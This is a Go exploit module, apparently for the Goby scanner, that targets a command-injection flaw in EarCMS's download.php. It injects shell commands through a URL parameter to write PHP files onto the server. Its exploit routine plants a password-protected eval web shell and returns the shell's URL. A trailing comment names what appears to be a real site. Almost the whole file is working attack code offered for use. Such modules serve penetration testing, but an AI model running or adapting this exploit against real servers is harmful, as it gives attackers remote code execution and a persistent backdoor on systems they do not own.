package exploits

import (
	"fmt"
	"git.gobies.org/goby/goscanner/goutils"
	"git.gobies.org/goby/goscanner/jsonvul"
	"git.gobies.org/goby/goscanner/scanconfig"
	"git.gobies.org/goby/httpclient"
	"net/url"
	"strings"
)

func init() {
	expJson := `{
    "Name": "EarCMS download.php Exec",
    "Description": "Ear CMS is a content management system. There is a Code Execution Vulnerability in the ear distribution foreground. By constructing malicious code, the attacker can obtain the permission of the server.",
    "Product": "EarCMS",
    "Homepage": "https://gobies.org/",
    "DisclosureDate": "2021-06-10",
    "Author": "gobysec@gmail.com",
    "GobyQuery": "body=\"icon-comma\"",
    "Level": "3",
    "Impact": "<p>Hackers can execute any command on the server and write the back door, so as to invade the server and obtain the administrator authority of the server.</p>",
    "Recommendation": "<p>Upgrade to the latest version.</p>",
    "References": [
        "https://cn.gobies.org/"
    ],
    "HasExp": true,
    "ExpParams": [
        {
            "name": "cmd",
            "type": "input",
            "value": "<?php @eval($_POST[1]); if($_GET['act']=='del'){unlink(__FILE__);}?>"
        }
    ],
    "ExpTips": {
        "Type": "",
        "Content": ""
    },
    "ScanSteps": null,
    "ExploitSteps": null,
    "Tags": [
        "RCE"
    ],
    "CVEIDs": null,
    "CVSSScore": "0.0",
    "AttackSurfaces": {
        "Application": null,
        "Support": null,
        "Service": null,
        "System": null,
        "Hardware": null
    },
    "PocId": "10206"
}`

	ExpManager.AddExploit(NewExploit(
		goutils.GetFileName(),
		expJson,
		func(exp *jsonvul.JsonVul, u *httpclient.FixUrl, ss *scanconfig.SingleScanConfig) bool {
			uri := "/source/pack/127.0.0.1/download.php?site=1"
			shell := "<?php echo md5(233);unlink(__FILE__);?>"
			filename := goutils.RandomHexString(32)
			Params := uri + url.QueryEscape(fmt.Sprintf(";echo '%s' > %s.php;", shell, filename))
			cfg := httpclient.NewGetRequestConfig(Params)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(u, cfg); err == nil {
				if strings.Contains(resp.Utf8Html, "exec() has been disabled for security reasons") {
					return false
				} else {
					shell_url := fmt.Sprintf("%s/source/pack/127.0.0.1/%s.php", u.FixedHostInfo, filename)
					if resp, err := httpclient.SimpleGet(shell_url); err == nil {
						return resp.StatusCode == 200 && strings.Contains(resp.Utf8Html, "e165421110ba03099a1c0393373c5b43")
					}
				}
			}
			return false
		},
		func(expResult *jsonvul.ExploitResult, ss *scanconfig.SingleScanConfig) *jsonvul.ExploitResult {
			uri := "/source/pack/127.0.0.1/download.php?site=1"
			shell := ss.Params["cmd"].(string)
			filename := goutils.RandomHexString(32)
			Params := uri + url.QueryEscape(fmt.Sprintf(";echo '%s' > %s.php;", shell, filename))
			cfg := httpclient.NewGetRequestConfig(Params)
			cfg.VerifyTls = false
			cfg.FollowRedirect = false
			if resp, err := httpclient.DoHttpRequest(expResult.HostInfo, cfg); err == nil {
				if strings.Contains(resp.Utf8Html, "exec() has been disabled for security reasons") {
					return expResult
				} else {
					shell_url := fmt.Sprintf("%s/source/pack/127.0.0.1/%s.php", expResult.HostInfo.FixedHostInfo, filename)
					if resp, err := httpclient.SimpleGet(shell_url); err == nil {
						if resp.StatusCode == 200 {
							expResult.Success = true
							expResult.Output = fmt.Sprintf(`shell url: %s, pass:1`, shell_url)
						}
					}
				}
			}
			return expResult
		},
	))
}

//http://fenfa.wyzqw.xyz
